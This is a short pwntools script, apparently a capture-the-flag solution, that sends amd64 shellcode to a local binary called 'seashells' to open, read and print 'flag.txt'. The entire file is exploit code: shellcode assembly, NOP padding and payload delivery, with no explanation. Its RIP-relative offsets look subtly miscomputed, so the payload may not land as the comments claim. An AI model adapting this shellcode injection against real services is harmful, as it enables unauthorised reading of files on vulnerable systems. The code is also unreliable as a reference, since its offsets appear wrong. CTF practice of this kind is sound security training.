from pwn import *

context.binary = './seashells'
context.arch = 'amd64'

# Set relative offsets (from RIP) to stack-located data
offset_flag = 0x100
offset_buf  = 0x200

# Shellcode (purely RIP-relative, so works with PIE + stack)
shellcode = asm(f"""
    /* open("flag.txt", O_RDONLY) */
    lea rdi, [rip + {offset_flag}]
    xor rsi, rsi
    mov eax, 2
    syscall

    /* read(fd, buf, 100) */
    mov rdi, rax
    lea rsi, [rip + {offset_buf}]
    mov edx, 100
    xor eax, eax
    syscall

    /* write(1, buf, nbytes) */
    mov edi, 1
    lea rsi, [rip + {offset_buf}]
    mov eax, 1
    syscall

    /* exit(0) */
    mov eax, 60
    xor edi, edi
    syscall
""")

# Stack layout:
# [ shellcode ][ NOPs ][ "flag.txt\0" ][ padding ][ buffer for read() ]

payload = shellcode
payload += b"\x90" * (offset_flag - len(payload))  # pad to flag string
payload += b"flag.txt\x00"
payload += b"\x00" * (offset_buf - len(payload))   # pad to buffer
payload += b"\x00" * 0x100                         # dummy read buffer space

# Run locally
def local():
    p = process('./seashells')
    p.recvuntil(b"collected >>")
    p.sendline(payload)
    p.interactive()

local()
